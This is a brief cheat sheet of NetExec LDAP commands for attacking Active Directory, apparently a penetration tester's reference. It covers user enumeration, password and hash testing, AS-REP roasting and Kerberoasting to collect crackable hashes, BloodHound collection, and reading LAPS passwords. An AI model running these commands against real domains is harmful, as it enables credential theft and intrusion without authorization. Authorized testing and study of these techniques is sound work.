# Netexec Cheat Sheet

## Basic
nxc ldap <IP> -u user -p pass

## User Enumeration
nxc ldap <IP> -u user -p pass --users

## Credential Testing
nxc ldap <IP> -u user -p pass
nxc ldap <IP> -u user -H <hash>

## ASREPRoast
nxc ldap <IP> -u users.txt -p '' --asreproast out.txt

## Kerberoast
nxc ldap <IP> -u user -p pass --kerberoasting hash.txt

## BloodHound
nxc ldap <IP> -u user -p pass --bloodhound --collection All

## LAPS
nxc ldap <IP> -u user -p pass -M laps
